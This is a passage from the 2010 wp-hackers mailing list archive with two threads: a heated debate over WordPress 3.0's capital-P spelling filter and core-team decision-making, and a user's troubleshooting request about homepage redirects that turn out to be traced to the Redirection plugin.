	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>	<4C32ED9B.5060207@thedextrousweb.com>	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
	<AANLkTinkfC7skDGnMm2UGY6E3teku1Rccfmdjhp9Mssv@mail.gmail.com>
Message-ID: <4C336552.3000601@mullenweg.com>

On 7/6/2010 6:14 AM, Ben Huson wrote:
> 1. You cannot write "You spell it WordPress not Wordpress" (If you
> want to write this you probably know or can find out how to remove the
> filter)

The str_replace is fairly naive, you can easily avoid it by using HTML 
entities for any characters, or putting an empty span inside of the word.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From Gavin.Pearce at 3seven9.com  Tue Jul  6 17:18:53 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 18:18:53 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C33650B.2020306@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net><001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com><4C32AEE0.5070803@mullenweg.com>	<4C32ED9B.5060207@thedextrousweb.com><CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
	<4C33650B.2020306@mullenweg.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FC1@tbs-sbs01.TBS.local>

> Not really. :/

Ha - in that case we shall be considered equal.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Matt
Mullenweg
Sent: 06 July 2010 18:17
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 7/6/2010 5:32 AM, Gavin Pearce wrote:
> That
> said, you clearly have time spare for snide remarks yourself though?

Not really. :/

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From mailapera at gmail.com  Tue Jul  6 17:19:23 2010
From: mailapera at gmail.com (mailapera)
Date: Tue, 6 Jul 2010 19:19:23 +0200
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTimhMMnsy97otZdNU5chMKGjMpaClVbsnVo5CoFk@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com> 
	<AANLkTikZzwHe-bO8Wre9K6ydDHDN2L1gNpdKX_6RHuYj@mail.gmail.com> 
	<AANLkTimhMMnsy97otZdNU5chMKGjMpaClVbsnVo5CoFk@mail.gmail.com>
Message-ID: <AANLkTinpLil4_o2bQps3_kyylzeNe_rIGyLMgIaFbskf@mail.gmail.com>

Another piece of info:
The redirection is written in the DB table named
wp_redirection_modules and is one of three redirections

The id is 2, type is apache, name is Apache and options is
a:1:{s:8:"location";s:55:"/home/thriftyt/public_html/experience-tuscany/.htaccess";}



On Tue, Jul 6, 2010 at 7:00 PM, mailapera <mailapera at gmail.com> wrote:
> Hi,
>
>> what is the slug of the new page?
> I just created a new page and the error is producing. The slug is URL
> is http://experience-tuscany.thriftytuscany.com/experience-tuscany
>
>> Have you tried updating permalinks ?
> Yes, I have set them to default then to custom again
>
>> Do you have other code in .htaccess besides what WP inserts?
> I seem to have the plain one
>
> # BEGIN WordPress
> <IfModule mod_rewrite.c>
> RewriteEngine On
> RewriteBase /
> RewriteRule ^index\.php$ - [L]
> RewriteCond %{REQUEST_FILENAME} !-f
> RewriteCond %{REQUEST_FILENAME} !-d
> RewriteRule . /index.php [L]
> </IfModule>
>
> # END WordPress
>
>> what permalink structure are you using?
> /%postname%/%post_id%
>
>> are all your pages redirecting or just the new one?
> Only the new one
>
>> when you put in your site's address are you directed to the new page?
> Yes
>
>> And finally if you load the twentyten theme does this still happen?
> Yes
>
> Thanks for your help. Right now if you go to the blog you will see it
> is all messed up
>
>
>
>
> On Tue, Jul 6, 2010 at 6:40 PM, mccormicky <mccormicky at gmail.com> wrote:
>> I have questions about your error:
>> what is the slug of the new page?
>> Have you tried updating permalinks ?
>> Do you have other code in .htaccess besides what WP inserts?
>> what permalink structure are you using?
>> are all your pages redirecting or just the new one?
>> when you put in your site's address are you directed to the new page?
>>
>> And finally if you load the twentyten theme does this still happen?
>>
>> On Tue, Jul 6, 2010 at 12:27 PM, mailapera <mailapera at gmail.com> wrote:
>>
>>> Hi, I am posting here as I can't get any help on the forums.
>>>
>>> I installed 3.0 and after creating a new page, additional to those I
>>> already had prior to the upgrade to 3.0, my homepage redirects to that
>>> newly created page with a 301 permanent redirect. If I delete the page
>>> the redirect stays and produces a 404 error each time I try to visit
>>> the homepage. To eliminate the error I have to go in the DB and delete
>>> the 301 entry.
>>>
>>> I also tried creating multiple new pages. The result is that after
>>> deleting from the DB the oldest page (of the newly created ones) the
>>> redirect moves to the next newly created page in line. So I cannot
>>> create any new page.
>>>
>>> I tried disabling all plugins and the error is still in place. I have
>>> no idea what produces it.
>>>
>>> Thanks for any help
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>

From m at mullenweg.com  Tue Jul  6 17:19:53 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 13:19:53 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C333B03.8010603@rotorised.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>
	<4C333B03.8010603@rotorised.com>
Message-ID: <4C3365B9.7040202@mullenweg.com>

On 7/6/2010 10:17 AM, Ryan McCue wrote:
> I'm staying out of the discussion apart for this reason. I'm not on this
> list because I want to hear people bikeshedding irrelevant stuff like
> this, I'm here because I want to participate in discussions about
> hacking WordPress.

Thank you!

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 17:20:17 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 13:20:17 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C333EAD.8080508@thedextrousweb.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>	<4C333B03.8010603@rotorised.com>
	<4C333EAD.8080508@thedextrousweb.com>
Message-ID: <4C3365D1.3030104@mullenweg.com>

On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
> I wrote a patch weeks ago to take it out. I'm really not trying to be
> difficult! I just think this filter is a terrible idea. And it's a
> little sad to witness the total lack of interest from the core team.
> This isn't how it's supposed to work, IMO.

Maybe write and promote a plugin, and we can see how many downloads it gets?

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From Gavin.Pearce at 3seven9.com  Tue Jul  6 17:20:38 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 18:20:38 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C336552.3000601@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net><001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>	<4C32ED9B.5060207@thedextrousweb.com>	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com><AANLkTinkfC7skDGnMm2UGY6E3teku1Rccfmdjhp9Mssv@mail.gmail.com>
	<4C336552.3000601@mullenweg.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FC2@tbs-sbs01.TBS.local>

> The str_replace is fairly naive, you can easily avoid it by using HTML

> entities for any characters, or putting an empty span inside of the
word.

But that's not the point - what do we *really* gain by having this
filter other than the possibility of upsetting a few people and breaking
a few sites?

Gav

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Matt
Mullenweg
Sent: 06 July 2010 18:18
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 7/6/2010 6:14 AM, Ben Huson wrote:
> 1. You cannot write "You spell it WordPress not Wordpress" (If you
> want to write this you probably know or can find out how to remove the
> filter)

The str_replace is fairly naive, you can easily avoid it by using HTML 
entities for any characters, or putting an empty span inside of the
word.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From eric at eamann.com  Tue Jul  6 17:30:29 2010
From: eric at eamann.com (eric at eamann.com)
Date: Tue, 6 Jul 2010 10:30:29 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3365D1.3030104@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>	<4C333B03.8010603@rotorised.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
Message-ID: <440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>

The same logic could be argued in the reverse for additional filters like this.
?Write a plug-in to add the feature and see how many downloads it gets before
rolling it in to core. ?Having to write a plug-in to remove a trivial feature is
one of the reasons many developers I know consider WordPress to be "bloatware."
?
Some time ago I wrote a patch in response to a user's request that we add Skype
and Facebook and LinkedIn and other fields to the profile page ... it was
rejected because "There's a filter there, which means a plugin can easily
control all of this." (ticket #11367) ?It makes sense that we not include
additional (trivial) functionality like this into core ... it made sense there
and it still makes sense now.
?
To be honest, the P function didn't completely break my blog. ?However, it did
mess with several images on my site. ?Years ago, when I first started with
WordPress, I used the "one-click installer" my web host provided. ?It set my
directory as www.mydomain.com/Wordpress ... so every image I uploaded in the 2
years I was there was stored as www.mydomain.com/Wordpress/wp-content/... ?I've
gone back through and changed them (it was a bad naming schema to begin with),
but that's not really the point. ?The point is that we have an inconsistent
development process:
?
- A trivial feature built by a member of the community-at-large is identified as
such and rejected.
- A trivial feature built by a core team member is included and requests to
remove the feature are dismissed by the core developers.
?
It doesn't paint a pretty picture of the core teams' opinion of the rest of the
community ...
?

On July 6, 2010 at 5:20 PM Matt Mullenweg <m at mullenweg.com> wrote:

> On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
> > I wrote a patch weeks ago to take it out. I'm really not trying to be
> > difficult! I just think this filter is a terrible idea. And it's a
> > little sad to witness the total lack of interest from the core team.
> > This isn't how it's supposed to work, IMO.
>
> Maybe write and promote a plugin, and we can see how many downloads it gets?
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From m at mullenweg.com  Tue Jul  6 17:37:04 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 13:37:04 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C335DBD.4020802@simplercomputing.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>
	<4C335DBD.4020802@simplercomputing.net>
Message-ID: <4C3369C0.7040107@mullenweg.com>

On 7/6/2010 12:45 PM, Mark E wrote:
> How about making that function into a plugin that people have to enable
> - like Akismet? Seems like a more reasonable solution that forcing
> people to get rid of it by adding a plugin.

Filters and functionality, such as plugin updates, themes (at all), 
autop, texturize, URL typo fixes, revisions, canonical redirects, 
widgets, trash, WYSIWYG, and more have been included in core WordPress 
despite highly vocal objections on wp-hackers and downvotes on Trac (or 
Mosquito for the older ones) even though all of them could be plugins.

If something makes things better for the vast majority of users and 
provides an opt-out mechanism then an educated decision is made to 
enable it for everyone. This allows us to craft the best user 
experience, in our opinion, and not clutter the interface with dozens 
(if not hundreds) of additional options or bundled plugins. (A plugin 
might be just a few lines, but its presence is a cognitive load.)

For a good historical overview of things people have strongly objected 
to going into WordPress, check out a search for "disable" on the Plugin 
Directory:

http://wordpress.org/extend/plugins/search.php?q=disable

By their popularity, it seems that more often than not we've made the 
correct decision, but there's nothing saying we might not be wrong in 
the future and so it's worth watching the stats.

(As a statistical aside, /Disable WordPress (Core|Plugin) Updates?/ is 
artificially popular because it was erroneously bundled with Dreamhost's 
auto-install for a while, which has since been corrected.)

If someone made a similar plugin for the capital P dangit function I 
think it would be perfectly appropriate to promote that from 3.0's Codex 
page next to the line adding the feature, and I would even be willing to 
add it to the release announcement. From experience, I think this entire 
thing will blow over but I'm completely open to the possibility of being 
wrong.

I hope that assuages people's alarm, and that you continue to enjoy 
Wordpress in the future.

*cough* ;)

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 17:39:33 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 13:39:33 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>	<4C333B03.8010603@rotorised.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com>
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
Message-ID: <4C336A55.6080803@mullenweg.com>

On 7/6/2010 1:30 PM, eric at eamann.com wrote:
> Some time ago I wrote a patch in response to a user's request that we add Skype
> and Facebook and LinkedIn and other fields to the profile page ... it was
> rejected because "There's a filter there, which means a plugin can easily
> control all of this." (ticket #11367)  It makes sense that we not include
> additional (trivial) functionality like this into core ... it made sense there
> and it still makes sense now.

For what it's worth, I think it would be nice to modernize those fields, 
and even go a step further to authenticate them where possible. I would 
have said so if I had seen that ticket.

> It doesn't paint a pretty picture of the core teams' opinion of the rest of the
> community ...

One of the core tenets of Open Source development is that people can 
disagree, strongly, but still respect each other.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From mailapera at gmail.com  Tue Jul  6 17:45:29 2010
From: mailapera at gmail.com (mailapera)
Date: Tue, 6 Jul 2010 19:45:29 +0200
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTinpLil4_o2bQps3_kyylzeNe_rIGyLMgIaFbskf@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com> 
	<AANLkTikZzwHe-bO8Wre9K6ydDHDN2L1gNpdKX_6RHuYj@mail.gmail.com> 
	<AANLkTimhMMnsy97otZdNU5chMKGjMpaClVbsnVo5CoFk@mail.gmail.com> 
	<AANLkTinpLil4_o2bQps3_kyylzeNe_rIGyLMgIaFbskf@mail.gmail.com>
Message-ID: <AANLkTil_w-0K-vnyMdQAW_aNXvVjkPO5xkcOa8HAHf4L@mail.gmail.com>

I am returning the website to a working standing, I hope you got the
chance to see the error in production. I cannot leave the site broken
too long.
Thanks


On Tue, Jul 6, 2010 at 7:19 PM, mailapera <mailapera at gmail.com> wrote:
> Another piece of info:
> The redirection is written in the DB table named
> wp_redirection_modules and is one of three redirections
>
> The id is 2, type is apache, name is Apache and options is
> a:1:{s:8:"location";s:55:"/home/thriftyt/public_html/experience-tuscany/.htaccess";}
>
>
>
> On Tue, Jul 6, 2010 at 7:00 PM, mailapera <mailapera at gmail.com> wrote:
>> Hi,
>>
>>> what is the slug of the new page?
>> I just created a new page and the error is producing. The slug is URL
>> is http://experience-tuscany.thriftytuscany.com/experience-tuscany
>>
>>> Have you tried updating permalinks ?
>> Yes, I have set them to default then to custom again
>>
>>> Do you have other code in .htaccess besides what WP inserts?
>> I seem to have the plain one
>>
>> # BEGIN WordPress
>> <IfModule mod_rewrite.c>
>> RewriteEngine On
>> RewriteBase /
>> RewriteRule ^index\.php$ - [L]
>> RewriteCond %{REQUEST_FILENAME} !-f
>> RewriteCond %{REQUEST_FILENAME} !-d
>> RewriteRule . /index.php [L]
>> </IfModule>
>>
>> # END WordPress
>>
>>> what permalink structure are you using?
>> /%postname%/%post_id%
>>
>>> are all your pages redirecting or just the new one?
>> Only the new one
>>
>>> when you put in your site's address are you directed to the new page?
>> Yes
>>
>>> And finally if you load the twentyten theme does this still happen?
>> Yes
>>
>> Thanks for your help. Right now if you go to the blog you will see it
>> is all messed up
>>
>>
>>
>>
>> On Tue, Jul 6, 2010 at 6:40 PM, mccormicky <mccormicky at gmail.com> wrote:
>>> I have questions about your error:
>>> what is the slug of the new page?
>>> Have you tried updating permalinks ?
>>> Do you have other code in .htaccess besides what WP inserts?
>>> what permalink structure are you using?
>>> are all your pages redirecting or just the new one?
>>> when you put in your site's address are you directed to the new page?
>>>
>>> And finally if you load the twentyten theme does this still happen?
>>>
>>> On Tue, Jul 6, 2010 at 12:27 PM, mailapera <mailapera at gmail.com> wrote:
>>>
>>>> Hi, I am posting here as I can't get any help on the forums.
>>>>
>>>> I installed 3.0 and after creating a new page, additional to those I
>>>> already had prior to the upgrade to 3.0, my homepage redirects to that
>>>> newly created page with a 301 permanent redirect. If I delete the page
>>>> the redirect stays and produces a 404 error each time I try to visit
>>>> the homepage. To eliminate the error I have to go in the DB and delete
>>>> the 301 entry.
>>>>
>>>> I also tried creating multiple new pages. The result is that after
>>>> deleting from the DB the oldest page (of the newly created ones) the
>>>> redirect moves to the next newly created page in line. So I cannot
>>>> create any new page.
>>>>
>>>> I tried disabling all plugins and the error is still in place. I have
>>>> no idea what produces it.
>>>>
>>>> Thanks for any help
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>

From mailapera at gmail.com  Tue Jul  6 18:01:22 2010
From: mailapera at gmail.com (mailapera)
Date: Tue, 6 Jul 2010 20:01:22 +0200
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTil_w-0K-vnyMdQAW_aNXvVjkPO5xkcOa8HAHf4L@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com> 
	<AANLkTikZzwHe-bO8Wre9K6ydDHDN2L1gNpdKX_6RHuYj@mail.gmail.com> 
	<AANLkTimhMMnsy97otZdNU5chMKGjMpaClVbsnVo5CoFk@mail.gmail.com> 
	<AANLkTinpLil4_o2bQps3_kyylzeNe_rIGyLMgIaFbskf@mail.gmail.com> 
	<AANLkTil_w-0K-vnyMdQAW_aNXvVjkPO5xkcOa8HAHf4L@mail.gmail.com>
Message-ID: <AANLkTimagtBRXQQQAx-gKRkVQvkdRXlOzd6fF6H4NnFe@mail.gmail.com>

Another update (the last one): The redirect also appeared on the table
wp_redirection_items

On Tue, Jul 6, 2010 at 7:45 PM, mailapera <mailapera at gmail.com> wrote:
> I am returning the website to a working standing, I hope you got the
> chance to see the error in production. I cannot leave the site broken
> too long.
> Thanks
>
>
> On Tue, Jul 6, 2010 at 7:19 PM, mailapera <mailapera at gmail.com> wrote:
>> Another piece of info:
>> The redirection is written in the DB table named
>> wp_redirection_modules and is one of three redirections
>>
>> The id is 2, type is apache, name is Apache and options is
>> a:1:{s:8:"location";s:55:"/home/thriftyt/public_html/experience-tuscany/.htaccess";}
>>
>>
>>
>> On Tue, Jul 6, 2010 at 7:00 PM, mailapera <mailapera at gmail.com> wrote:
>>> Hi,
>>>
>>>> what is the slug of the new page?
>>> I just created a new page and the error is producing. The slug is URL
>>> is http://experience-tuscany.thriftytuscany.com/experience-tuscany
>>>
>>>> Have you tried updating permalinks ?
>>> Yes, I have set them to default then to custom again
>>>
>>>> Do you have other code in .htaccess besides what WP inserts?
>>> I seem to have the plain one
>>>
>>> # BEGIN WordPress
>>> <IfModule mod_rewrite.c>
>>> RewriteEngine On
>>> RewriteBase /
>>> RewriteRule ^index\.php$ - [L]
>>> RewriteCond %{REQUEST_FILENAME} !-f
>>> RewriteCond %{REQUEST_FILENAME} !-d
>>> RewriteRule . /index.php [L]
>>> </IfModule>
>>>
>>> # END WordPress
>>>
>>>> what permalink structure are you using?
>>> /%postname%/%post_id%
>>>
>>>> are all your pages redirecting or just the new one?
>>> Only the new one
>>>
>>>> when you put in your site's address are you directed to the new page?
>>> Yes
>>>
>>>> And finally if you load the twentyten theme does this still happen?
>>> Yes
>>>
>>> Thanks for your help. Right now if you go to the blog you will see it
>>> is all messed up
>>>
>>>
>>>
>>>
>>> On Tue, Jul 6, 2010 at 6:40 PM, mccormicky <mccormicky at gmail.com> wrote:
>>>> I have questions about your error:
>>>> what is the slug of the new page?
>>>> Have you tried updating permalinks ?
>>>> Do you have other code in .htaccess besides what WP inserts?
>>>> what permalink structure are you using?
>>>> are all your pages redirecting or just the new one?
>>>> when you put in your site's address are you directed to the new page?
>>>>
>>>> And finally if you load the twentyten theme does this still happen?
>>>>
>>>> On Tue, Jul 6, 2010 at 12:27 PM, mailapera <mailapera at gmail.com> wrote:
>>>>
>>>>> Hi, I am posting here as I can't get any help on the forums.
>>>>>
>>>>> I installed 3.0 and after creating a new page, additional to those I
>>>>> already had prior to the upgrade to 3.0, my homepage redirects to that
>>>>> newly created page with a 301 permanent redirect. If I delete the page
>>>>> the redirect stays and produces a 404 error each time I try to visit
>>>>> the homepage. To eliminate the error I have to go in the DB and delete
>>>>> the 301 entry.
>>>>>
>>>>> I also tried creating multiple new pages. The result is that after
>>>>> deleting from the DB the oldest page (of the newly created ones) the
>>>>> redirect moves to the next newly created page in line. So I cannot
>>>>> create any new page.
>>>>>
>>>>> I tried disabling all plugins and the error is still in place. I have
>>>>> no idea what produces it.
>>>>>
>>>>> Thanks for any help
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>
>

From mda at blogwaffe.com  Tue Jul  6 18:13:11 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Tue, 6 Jul 2010 11:13:11 -0700
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com>
Message-ID: <AANLkTilWOeF6vXIre90JId1yLk71gduhXyEg0fsaCKxT@mail.gmail.com>

On Tue, Jul 6, 2010 at 9:27 AM, mailapera <mailapera at gmail.com> wrote:
> I installed 3.0 and after creating a new page, additional to those I
> already had prior to the upgrade to 3.0, my homepage redirects to that
> newly created page with a 301 permanent redirect. If I delete the page
> the redirect stays and produces a 404 error each time I try to visit
> the homepage. To eliminate the error I have to go in the DB and delete
> the 301 entry.

This list is not a support list.

You have a problem with Redirects.  Do you have any redirection
plugins installed?  Have you tried looking through the source of your
plugins to find mentions of the wp_redirection_items and
wp_redirection_modules tables (these are not core tables)?

My guess is that this is a problem with Urban Giraffe's Redirection
plugin http://urbangiraffe.com/plugins/redirection/  Do you have that
plugin installed? If you disable the plugin, does the problem go away
(always a good debugging step).

Here's a link which addresses what sounds like your problem.

